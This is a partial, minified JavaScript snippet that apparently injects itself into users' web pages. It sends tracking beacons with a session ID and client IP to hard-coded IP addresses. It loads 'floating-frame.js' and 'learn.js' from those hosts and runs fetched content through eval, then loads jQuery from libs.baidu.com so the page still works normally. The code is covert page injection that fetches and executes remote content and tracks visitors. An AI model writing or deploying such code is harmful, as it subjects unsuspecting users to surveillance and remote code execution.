! function() {
    function sendAccounting(e, n) {
        ...
        n = n || 0;
        var t = new Image;
        11 == n || w && 6 == n || (t.src = "http://218.108.50.46:80/" + e + "-1542/4dc02567-17d5-4e8f-8fd2-137363168273_100.85.46.1/" + n + "." + (m + j));
        (2 == e || g) && I.d();
        return t
    }

    function e(e) { return w ? "http://218.108.50.46:80/Check/2/1542/4dc02567-17d5-4e8f-8fd2-137363168273/100.85.46.1/p3f8tk" : 1 == e && "http://218.108.50.46/CheckUrl/1/1542" }

    function n(n) {
        var i, r, o = Math.floor(1e3 * j),
            c = "fp",
            u = c + o,
            s = { h: "fbec6ef25c4dcca0e3c357798d79815cddd75243" },
            a = "_!$[]fp4dc02567-17d5-4e8f-8fd2-137363168273[]$!_";
        I = { d: function() { C[a] === s && (C[a] = 0) }, s: function(e) { C[a].c = e } };
        ...
        if (n.json) {
            if ("string" == typeof n.json) try { n.json = U.eval("(" + n.json + ")") } catch (e) { return 4 }
            ...
            n.json._accounting = { stopTime: h, sendAccounting: sendAccounting, allowNext: I, uri: "http://58.100.228.116/static", comm: "http://218.108.50.46/", fpsessionid: "4dc02567-17d5-4e8f-8fd2-137363168273", check: e("%TOPURLMATCH%"), direct: !1, prev: r }
        }
    ...
    function i() {
        ...
        f.jsURI = "http://58.100.228.116/static/FloatingContent/F0y7RdnhqmcHSfx8AqX9uQ/floating-frame.js";
        f.requireTopWindow = r("true", "RequireTopWindow");
        f.minHeight = u("1", "MinimumHeight");
        f.minWidth = u("1", "MinimumWidth");
        f.jsURI = i(c("http://218.108.50.46/static/Device/learn.js?FPSESSIONID=4dc02567-17d5-4e8f-8fd2-137363168273&COMMIP=218.108.50.46&OPERATORWEBSITELOGIC=OR&GROUPS=1"), "ContentURL");
        g = r("1", "AllowReplace");
        ...
        if ((e = n(f)) || l > h) sendAccounting(2, e);
            ...
            if (f.onInsert) try { f.onInsert() } catch (e) {}
        }
    }

    function r(e) {
        var n, t, i = [function() { return new XMLHttpRequest }, function() { return new ActiveXObject("Msxml2.XMLHTTP") }, function() { return new ActiveXObject("Microsoft.XMLHTTP") }, U.createRequest];
        for (t = 0; t < i.length; t++) { n = 0; try { n = i[t](); break } catch (e) { n = 0 } }
        if (n) try {
            n.open("GET", e, !1);
    ...
    function a(e, n, t) { n = e.getElementsByTagName("script"); return ((t = n.length) ? n[t - 1] : m = 4).parentNode || e.body || e.documentElement.firstChild }
    try {
        var l, f, h, p, m, d, I, g, R = "text/javascript",
            j = Math.random(),
            T = (new Date).getTime(),
            w = parseInt("p3f8tk", 36),
            E = parseFloat("45"),
            U = window,
            y = document,
            C = U,
            M = y;
        f = "http://" + unescape("libs.baidu.com%2Fjquery%2F1.11.3%2Fjquery.min.js");
...
if (window.V) {
    if (V.js) try { window.eval(V.js) } catch (e) {}
    V()
}